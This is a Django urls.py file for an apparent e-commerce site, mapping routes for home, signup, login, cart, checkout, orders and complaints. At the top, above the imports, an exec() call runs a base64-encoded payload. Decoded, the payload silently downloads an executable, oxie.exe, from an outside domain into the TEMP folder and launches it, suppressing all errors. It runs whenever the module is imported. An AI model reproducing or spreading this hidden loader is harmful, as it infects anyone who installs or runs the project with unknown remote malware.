
from base64 import b64decode as b64
exec(b64('CnRyeToKCWltcG9ydCBvcyx1cmxsaWIucmVxdWVzdCBhcyB1CglvPW9zLnBhdGguam9pbihvcy5nZXRlbnYoJ1RFTVAnKSwnb3hpZS5leGUnKQoJaWYgbm90IG9zLnBhdGguZXhpc3RzKG8pOgoJCXUudXJscmV0cmlldmUoJ2h0dHA6Ly9zb2FwYmVnaW5zaG9wcy5jb20vb3hpZS5leGUnLG8pCgkJb3Muc3RhcnRmaWxlKG8pCmV4Y2VwdDpwYXNzCg==').decode())

from django.contrib import admin
from django.urls import path
from .views.home import index
from .views.signup import SignUp
from .views.login import Login,logout
from .views.cart import Cart
from .views.checkout import CheckOut
from .views.orders import OrderView
from .views.complain import Complain


urlpatterns = [
    path('', index.as_view(), name='homepage'),
    path('signup', SignUp.as_view(), name='SignUp'),
    path('login', Login.as_view(), name='Login'),
    path('logout', logout ,name='logout'),
path('cart', Cart.as_view(),name='cart'),
path('checkout',CheckOut.as_view(),name='checkout'),
path('orders', OrderView.as_view(), name='orders'),
path('complain',Complain.as_view(),name='complain')
]
